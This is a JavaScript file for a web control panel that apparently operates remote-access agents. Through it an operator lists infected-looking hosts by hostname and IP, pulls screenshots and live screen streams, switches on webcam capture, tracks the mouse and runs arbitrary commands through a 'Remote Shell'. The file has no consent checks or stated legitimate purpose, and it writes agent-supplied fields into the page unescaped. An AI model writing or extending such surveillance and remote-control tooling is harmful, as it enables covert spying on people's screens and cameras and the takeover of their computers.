let socket = io();
let currentAgentId = null;
let streamInterval = null;
let webcamInterval = null;

const statusEl = document.getElementById('status');
const agentList = document.getElementById('agent-list');
const agentSelect = document.getElementById('agent-select');
const screenImage = document.getElementById('screen-image');
const webcamImage = document.getElementById('webcam-image');
const mouseCursor = document.getElementById('mouse-cursor');
const agentInfo = document.getElementById('agent-info');
const cmdOutput = document.getElementById('cmd-output');
const cmdInput = document.getElementById('cmd-input');
const cmdModal = document.getElementById('cmd-modal');

// UI Buttons
const btnScreenshot = document.getElementById('btn-screenshot');
const btnWebcam = document.getElementById('btn-webcam');
const btnStream = document.getElementById('btn-stream');
const btnCmd = document.getElementById('btn-cmd');

socket.on('connect', () => {
  statusEl.textContent = 'Connected';
  statusEl.className = 'connected';
});

socket.on('disconnect', () => {
  statusEl.textContent = 'Disconnected';
  statusEl.className = '';
});

// Update agent list
socket.on('dashboard:agents', (agents) => {
  agentList.innerHTML = '';
  agentSelect.innerHTML = '<option value="">— Select an agent —</option>';
  
  if (agents.length === 0) {
    agentList.innerHTML = '<p class="hint">Waiting for agents...</p>';
    return;
  }
  
  agents.forEach(a => {
    // Sidebar item
    const div = document.createElement('div');
    div.className = 'agent-item' + (currentAgentId === a.id ? ' active' : '');
    div.innerHTML = `<div class="name">${a.hostname}</div><div class="ip">${a.ip} • ${a.platform}</div>`;
    div.onclick = () => subscribeToAgent(a.id);
    agentList.appendChild(div);
    
    // Select option
    const opt = document.createElement('option');
    opt.value = a.id;
    opt.textContent = `${a.hostname} (${a.ip})`;
    agentSelect.appendChild(opt);
  });
});

// Subscribe to agent
function subscribeToAgent(agentId) {
  if (currentAgentId) {
    socket.emit('dashboard:unsubscribe', currentAgentId);
  }
  currentAgentId = agentId;
  socket.emit('dashboard:subscribe', agentId);
  
  document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('active'));
  const items = document.querySelectorAll('.agent-item');
  const idx = Array.from(agentSelect.options).findIndex(o => o.value === agentId);
  if (items[idx - 1]) items[idx - 1].classList.add('active'); // offset by placeholder
  
  agentSelect.value = agentId;
  btnScreenshot.disabled = false;
  btnWebcam.disabled = false;
  btnStream.disabled = false;
  btnCmd.disabled = false;
  
  agentInfo.textContent = `Agent ID: ${agentId}\nSubscribed at: ${new Date().toISOString()}`;
}

agentSelect.addEventListener('change', () => {
  if (agentSelect.value) subscribeToAgent(agentSelect.value);
});

// Incoming screenshot
socket.on('dashboard:screenshot', (data) => {
  screenImage.src = `data:image/png;base64,${data.image}`;
});

// Incoming webcam
socket.on('dashboard:webcam', (data) => {
  webcamImage.src = `data:image/jpeg;base64,${data.image}`;
});

// Incoming mouse position
socket.on('dashboard:mouse', (data) => {
  const rect = screenImage.getBoundingClientRect();
  const scaleX = rect.width / screenImage.naturalWidth;
  const scaleY = rect.height / screenImage.naturalHeight;
  mouseCursor.style.display = 'block';
  mouseCursor.style.left = `${rect.left + data.x * scaleX}px`;
  mouseCursor.style.top = `${rect.top + data.y * scaleY}px`;
});

// Request screenshot
btnScreenshot.addEventListener('click', () => {
  if (currentAgentId) {
    socket.emit('dashboard:command', { agentId: currentAgentId, command: 'screenshot' });
  }
});

// Toggle webcam stream
btnWebcam.addEventListener('click', () => {
  if (webcamInterval) {
    clearInterval(webcamInterval);
    webcamInterval = null;
    btnWebcam.textContent = '📷 Webcam';
    socket.emit('dashboard:command', { agentId: currentAgentId, command: 'webcam_stop' });
  } else {
    btnWebcam.textContent = '⏹ Stop Webcam';
    socket.emit('dashboard:command', { agentId: currentAgentId, command: 'webcam_start' });
    webcamInterval = setInterval(() => {
      socket.emit('dashboard:command', { agentId: currentAgentId, command: 'webcam_frame' });
    }, 500);
  }
});

// Stream toggle (continuous screenshots)
btnStream.addEventListener('click', () => {
  if (streamInterval) {
    clearInterval(streamInterval);
    streamInterval = null;
    btnStream.textContent = '▶ Start Stream';
  } else {
    btnStream.textContent = '⏹ Stop Stream';
    streamInterval = setInterval(() => {
      socket.emit('dashboard:command', { agentId: currentAgentId, command: 'screenshot' });
    }, 1000);
  }
});

// Shell
btnCmd.addEventListener('click', () => {
  cmdModal.classList.remove('hidden');
  cmdOutput.textContent = '=== Remote Shell ===\n';
  cmdInput.value = '';
  cmdInput.focus();
});

document.querySelector('.close').onclick = () => cmdModal.classList.add('hidden');

cmdInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const cmd = cmdInput.value;
    cmdOutput.textContent += `$ ${cmd}\n`;
    cmdInput.value = '';
    socket.emit('dashboard:command', { agentId: currentAgentId, command: `shell:${cmd}` });
  }
});

socket.on('dashboard:shell_output', (data) => {
  cmdOutput.textContent += `${data.output}\n`;
  cmdOutput.scrollTop = cmdOutput.scrollHeight;
});
